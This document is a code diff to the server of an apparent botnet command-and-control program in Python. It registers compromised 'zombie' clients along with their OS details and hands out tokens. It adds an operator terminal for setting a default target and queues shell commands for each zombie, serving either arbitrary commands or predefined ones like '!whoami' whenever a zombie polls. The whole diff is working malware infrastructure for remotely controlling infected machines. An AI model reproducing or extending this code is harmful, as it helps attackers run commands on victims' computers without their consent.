@@ -13,10 +13,13 @@ from random import randint
 from modules.get_modules import generate_zombie_token
 import json
 from datetime import datetime
+from modules.terminal import Terminal
+import re
 
 
 serverLogger = Logger(file_name='server')
 serverModule = None
+terminalLogger = Logger(file_name='server')
 
 
 class ServerModule:
@@ -34,14 +37,18 @@ class ServerModule:
 
         # zombies address = zombie_ip:zombie_id ---> e.g. 10.10.10.10:56562
         # client id == zombie address
-        self.zombies_addresses_and_tokens = [] # [[zombie_ip:zombie_id, zombie_token, last_connection_time]]
+        # [[zombie_ip:zombie_id, zombie_token, last_connection_time, {"os_info" : "OS INFO"}]]
+        self.zombies_addresses_and_tokens = []
 
         # queued_commands list structure:
         # [[zombie_address1,command,random_command_id],
         # [zombie_address1,command2,random_command_id],
         # [zombie_address2,command,random_command_id]],
         # command id is random id for distinguishing responses from each other
+        # if command starts with : #specific_command: it is a special command like:
+        # #specific_command:!whoami
         self.queued_commands = []
+        self.default_target = None
 
     def start_server(self):
         try:
@@ -100,8 +107,29 @@ class ServerModule:
         server_stop_text = 'Server Stopped.'
         serverLogger.log(text=server_stop_text)
 
-    def queue_new_command(self, command, zombie_address):
-        pass
+    def queue_new_command(self, command, zombie_address, random_id):
+        self.queued_commands.append([zombie_address, command, random_id])
+
+    def send_command_from_terminal(
+            self,
+            command
+    ):
+        set_target_pattern = r'!set (.*) "(.*)"'
+        command = command.lower()
+        if command.startswith('!set'):
+            # !set target 192.168.1.23:5656
+            set_options = re.findall(set_target_pattern, command) #  [('target','192.168.1.23:5656')]
+            if len(set_options) == 1:
+                if set_options[0][0].strip() == 'target':
+                    self.default_target = set_options[0][1].strip()
+                    terminalLogger.log(text='Default target is set --> {}'.format(set_options[0][1].strip()))
+                else:
+                    terminalLogger.log(text='Invalid option! --> !help for Help')
+            else:
+                terminalLogger.log(text='Invalid option! --> !help for Help')
+        else:
+            terminal = Terminal(command=command, server_module=self)
+            Thread(target=terminal.interpret_command).start()
 
 
 class WebServer(BaseHTTPRequestHandler):
@@ -124,14 +152,26 @@ class WebServer(BaseHTTPRequestHandler):
             self.send_header("Content-type", "application/json")
             self.end_headers()
 
+            try:
+                client_os = request_params['client_os'][0]
+            except KeyError:
+                return
+            except IndexError:
+                return
+
             zombie_address = self.generate_random_client_address(zombie_ip=request_ip)
             rand_token = generate_zombie_token()
             # add zombie to zombies list
-            serverModule.zombies_addresses_and_tokens.append([zombie_address, rand_token, request_time])
+            serverModule.zombies_addresses_and_tokens.append(
+                [zombie_address, rand_token, request_time, {'os_info' : ' (OS : {}) '.format(client_os)}]
+            )
             # get json for client id and token
             resp_text = self.send_back_token_and_client_id_text(client_id=zombie_address, z_token=rand_token)
 
             self.wfile.write(bytes(resp_text, 'UTF-8'))
+
+            print('\nA ' + Fore.GREEN + 'zombie' + Fore.RESET +
+                  ' connected ---> address-in-terminal=' + zombie_address)
 
         elif req_type == 'get-signal':
             # check token and client id
@@ -190,8 +230,25 @@ class WebServer(BaseHTTPRequestHandler):
             __command_index_in_list = temp_list_command_address_and_command.index(client_address) + 1
             __command = temp_list_command_address_and_command[__command_index_in_list]
             __command_id = temp_list_command_address_and_command[__command_index_in_list + 1]
-            resp_text = self.send_command_back(command=__command, cmd_id=__command_id)
-            self.wfile.write(bytes(resp_text, 'UTF-8'))
+
+            terminalLogger.log(
+                'Zombie {} Sent Get Request ---> Command : ({}) '
+                'with Command ID : ({}) Sent.'
+                    .format(client_address, __command_id, __command_id)
+            )
+
+            # if command starts with : #special_command:!   it is a special command like:
+            # #special_command:!whoami
+            if __command.startswith('#special_command:!'):
+                special_cmd = __command.split('!')[1]
+                resp_text = self.send_specific_command(special_cmd=special_cmd, cmd_id=__command_id)
+                self.wfile.write(bytes(resp_text, 'UTF-8'))
+            else:
+                resp_text = self.send_command_back(command=__command, cmd_id=__command_id)
+                self.wfile.write(bytes(resp_text, 'UTF-8'))
+            # remove queued command after sending it to zombie
+            serverModule.queued_commands.remove([client_address, __command, __command_id])
+
             return
 
         else:
@@ -245,6 +302,17 @@ class WebServer(BaseHTTPRequestHandler):
         resp_structure = {
             'resp_type' : 'run_cmd',
             'cmd' : command,
+            'cmd_id' : cmd_id
+        }
+        json_string = json.dumps(resp_structure)
+        return json_string
+
+    def send_specific_command(self, special_cmd, cmd_id):
+        # send predefined command back to execute on client like !software or !whoami
+        # cmd_id is command id
+        resp_structure = {
+            'resp_type' : 'special_cmd',
+            's_cmd' : special_cmd,
             'cmd_id' : cmd_id
         }
         json_string = json.dumps(resp_structure)
